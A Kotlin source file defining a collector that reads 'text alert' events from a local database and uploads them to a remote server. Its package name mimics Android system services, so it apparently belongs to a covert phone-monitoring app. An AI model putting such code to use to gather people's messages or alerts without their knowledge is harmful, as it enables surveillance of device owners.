package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFiveApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose

class TextAlertEventCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        logVerbose("${AppConstants.TEXT_ALERT_TYPE} Retrieving logs from local app")
        localDatabaseSource.selectTextAlertEvents { logs ->
            if (logs.isNotEmpty()) {
                logVerbose("${AppConstants.TEXT_ALERT_TYPE} data = $logs")
                val startDate = logs[logs.size - 1].date
                val endDate = logs[0].date
                val serverHelper = RemoteServerHelper(
                    context,
                    AppConstants.TEXT_ALERT_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi,
                    startDate = startDate,
                    endDate = endDate
                )
                serverHelper.upload(logs)
            } else {
                logVerbose("${AppConstants.TEXT_ALERT_TYPE} No logs found")
            }
        }
    }
}